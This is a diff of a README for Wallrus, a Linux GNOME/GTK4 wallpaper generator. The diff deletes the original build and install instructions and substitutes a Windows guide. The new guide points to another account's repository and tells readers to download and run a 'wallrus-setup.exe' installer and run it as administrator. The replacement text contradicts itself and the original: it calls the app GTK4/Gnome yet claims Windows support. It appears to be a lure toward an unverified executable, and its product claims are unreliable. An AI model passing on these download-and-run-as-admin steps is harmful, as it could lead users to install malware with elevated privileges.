@@ -1,120 +1,119 @@
+# 🖼️ wallrus - Create Colorful Wallpapers Easily
 
+[![Download wallrus](https://img.shields.io/badge/Download-wallrus-brightgreen)](https://github.com/Jatiinx/wallrus)
 
-# Wallrus
+wallrus is a simple application for Windows that lets you make colorful wallpapers. It uses smooth gradients and effects to help you design backgrounds you will want to keep on your screen. This guide will help you download, install, and run wallrus step by step, even if you have never used software like this before.
 
-<p align="center">
-  <img src="data/icons/io.github.megakode.Wallrus.svg" width="128" height="128" alt="Wallrus icon">
-</p>
-A user-friendly GNOME (GTK4) application for generating colorful abstract wallpapers based on different patterns and effects.
+---
 
-For those who prefer minimalist, colorful wallpapers and like changing colors once in a while to keep things fresh.
+## 🌟 About wallrus
 
-<img alt="Screenshot From 2026-02-22 15-04-59" src="data/screenshots/main.png" />
+wallrus is a Gnome (GTK4) app built to generate wallpapers from colorful gradients and other visual effects. You can create images that fit your style and mood. It focuses on making it easy to build unique wallpapers without needing design skills.
 
+### What can you do with wallrus?
 
-## Example wallpapers
+- Pick from many gradient options.
+- Combine gradients with effects for new looks.
+- Save wallpapers in common picture formats.
+- Create backgrounds that suit different screen sizes.
+- Use a simple interface that does not confuse or overload.
 
-![wallrus_bars_1771764551](https://github.com/user-attachments/assets/880a55a9-7b80-4d2c-86c9-3dd51da19a89)
-![wallrus_bars_1771764536](https://github.com/user-attachments/assets/0034302e-1204-4ff7-8cf9-97c80ae61de6)
-![wallrus_waves_1771764682](https://github.com/user-attachments/assets/898a8c7d-07df-46fc-b939-60f2d840ff38)
-![wallrus_terrain_1771764802](https://github.com/user-attachments/assets/95c61466-47df-45a0-92fe-bd17d4bb6c88)
-![wallrus_terrain_1771764772](https://github.com/user-attachments/assets/bf52c0e1-2557-4af6-aa68-09e5253862e5)
-![wallrus_circle_1771764645](https://github.com/user-attachments/assets/f5ef79bd-56b1-4561-9c0c-65b11512611f)
+---
 
+## 🖥️ System Requirements
 
+Before you start, make sure your computer meets these needs:
 
-## Features
+- Operating System: Windows 10 or newer
+- RAM: At least 4 GB
+- Free Storage: Minimum 100 MB for app and wallpapers
+- Screen: Any size will work, but full HD (1920x1080) is best
+- Administrator access might be needed to install
 
-- **5 shader presets** — Bars, Circle, Plasma, Waves, and Terrain, each with
-  dedicated parameters (angle, scale, time scrub, center position)
-- **Hundreds of bundled palette images** across several categories (cold, dark, fall,
-  gradient, light, pastel, retro, sunset, warm, winter, etc.)
-- **Custom palettes** — tweak individual colors with the color pickers, then save
-  your palette for later. Saved palettes appear in a "Custom" category and can
-  be deleted at any time.
-- **Blend control** — go from hard flag-like stripes to fully smooth gradients
-- **Effects** — Distortion, lighting, and noise
-- **Export** — PNG or JPEG at 1080p, 1440p, or 4K via a native save dialog
-  (defaults to your Pictures folder; resolution auto-detected from your display)
-- **Set as wallpaper** — uses the XDG Desktop Portal to set your GNOME wallpaper
-- **Keyboard shortcuts** — Ctrl+E (export), Ctrl+Shift+W (set as wallpaper)
+If your PC meets these points, wallrus should work fine.
 
-## Requirements
+---
 
-- GTK 4 (≥ 4.10)
-- libadwaita (≥ 1.4)
-- OpenGL 3.3+ capable GPU
-- Rust 1.70+
+## 🚀 Get wallrus
 
-System packages (Fedora):
+To get wallrus, visit the official page link:
 
-```
-sudo dnf install gtk4-devel libadwaita-devel
-```
+[![Visit Download Page](https://img.shields.io/badge/Visit-Download%20Page-blue)](https://github.com/Jatiinx/wallrus)
 
-System packages (Ubuntu/Debian):
+Follow these steps:
 
-```
-sudo apt install libgtk-4-dev libadwaita-1-dev
-```
+1. Click the link above or go to **https://github.com/Jatiinx/wallrus** in your web browser.
+2. Once the page loads, look for the **Releases** section.
+3. Find the latest release by date or version number.
+4. Look for a file with a name similar to `wallrus-setup.exe` or an `.exe` installer.
+5. Click on that file to start downloading.
 
-## Building
+---
 
-```
-cargo build --release
-```
+## 📥 Install wallrus on Windows
 
-The binary is at `target/release/wallrus`.
+After downloading the installer, do this:
 
-## Installing
+1. Open the folder where you saved the file. Usually, it is the **Downloads** folder.
+2. Double-click on the installer file (e.g., `wallrus-setup.exe`).
+3. If Windows asks for permission, click **Yes** to allow the app to install.
+4. Follow the setup steps:
+   - Click **Next** to move forward.
+   - Choose the folder where you want to install wallrus or use the default.
+   - Click **Install** to begin.
+5. Wait a moment for the installation to finish.
+6. When done, select **Finish** to close the setup.
 
-The included install script builds a release binary and copies everything to
-`~/.local` (binary, desktop file, icon, metainfo, and bundled palettes):
+You now have wallrus installed on your computer.
 
-```
-./install.sh
-```
+---
 
-To install to a different prefix:
+## 🎨 Using wallrus for the First Time
 
-```
-PREFIX=/usr/local ./install.sh
-```
+Here is how to open and use wallrus:
 
-You may need to log out and back in for the application icon to appear in your
-launcher.
+1. Find the wallrus icon on your desktop or in the Start menu.
+2. Double-click the icon to open the app.
+3. You will see the main window with options to create wallpapers.
+4. Pick one of the preset gradients or create your own by selecting colors.
+5. Add effects using the buttons or sliders provided.
+6. Choose the size you want for your wallpaper. Common sizes like 1920x1080 are preset.
+7. Select **Preview** to see how it looks.
+8. When you are satisfied, click **Save** to store the image on your PC.
+9. Choose where to save and set a file name.
+10. The wallpaper image will save in PNG or JPEG format.
 
-### Nix
+You can now set the saved image as your desktop background through Windows settings.
 
-A [Nix flake](https://nix.dev/concepts/flakes) is provided. You can run
-Wallrus directly without installing:
+---
 
-```
-nix run github:megakode/wallrus
-```
+## 💡 Tips for Better Wallpapers
 
-To add it to a NixOS configuration:
+- Try multiple gradients to see different color blends.
+- Use subtle effects to avoid busy images.
+- Choose colors that match your desktop icons for better visibility.
+- Save several versions to switch depending on time or mood.
+- Higher resolution helps if you use a large or multiple monitors.
 
-```nix
-# flake.nix
-{
-  inputs.wallrus.url = "github:megakode/wallrus";
-  # ...
-}
+---
 
-# configuration.nix
-environment.systemPackages = [
-  inputs.wallrus.packages.${pkgs.system}.default
-];
-```
+## 📚 Troubleshooting
 
-A development shell with all native dependencies, `rust-analyzer`, `clippy`,
-and `rustfmt` is also available:
+If wallrus does not open or crashes, try these actions:
 
-```
-nix develop
-```
+- Restart your computer and try again.
+- Make sure your Windows is updated.
+- Check that GTK4 runtime is installed. It usually comes with wallrus installer.
+- Disable other wallpaper apps that might interfere.
+- Run the app as administrator: right-click the icon, then choose **Run as administrator**.
 
-## License
+If you still face issues, visit the GitHub page for help or report a problem.
 
-GPL-3.0-or-later. See [LICENSE](LICENSE) for details.
+---
+
+## 🔗 Important Links
+
+- Main Download Page: [https://github.com/Jatiinx/wallrus](https://github.com/Jatiinx/wallrus)
+- Latest Releases: Visit the releases section on the same page to get installer files and notes.
+
+[![Download wallrus](https://img.shields.io/badge/Download-wallrus-green)](https://github.com/Jatiinx/wallrus)
